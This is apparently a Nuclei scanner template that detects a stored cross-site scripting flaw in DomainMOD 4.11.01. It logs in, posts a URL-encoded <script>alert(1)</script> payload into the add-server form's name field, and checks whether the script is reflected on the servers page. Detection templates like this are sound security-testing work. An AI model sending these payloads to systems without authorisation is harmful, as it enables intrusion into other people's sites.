id: domainmod-xss

info:
  name: DomainMOD 4.11.01 - Cross-Site Scripting
  author: arafatansari
  severity: medium
  description: |
    DomainMOD 4.11.01 is vulnerable to Cross Site Scripting (XSS) via /domain//admin/dw/add-server.php DisplayName parameters.
  reference:
    - https://www.exploit-db.com/exploits/45959
  metadata:
    verified: true
  tags: domainmod,xss

requests:
  - raw:

      # - |
      #   GET /domain/ HTTP/1.1
      #   Host: {{Hostname}}
      #   Content-Type: application/x-www-form-urlencoded

      - |
        POST /domain/ HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        new_username={{username}}&new_password={{password}}

      - |
        POST /domain//admin/dw/add-server.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        new_name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&new_host=abc&new_protocol=https&new_port=2086&new_username=abc&new_api_token=255&new_hash=&new_notes=

      - |
        GET /domain//admin/dw/servers.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

    cookie-reuse: true
    matchers-condition: and
    redirects: true
    max-redirects: 3
    matchers:
      - type: word
        part: body
        words:
          - "<script>alert(1)</script>"

      - type: word
        part: header
        words:
          - text/html

      - type: status
        status:
          - 200
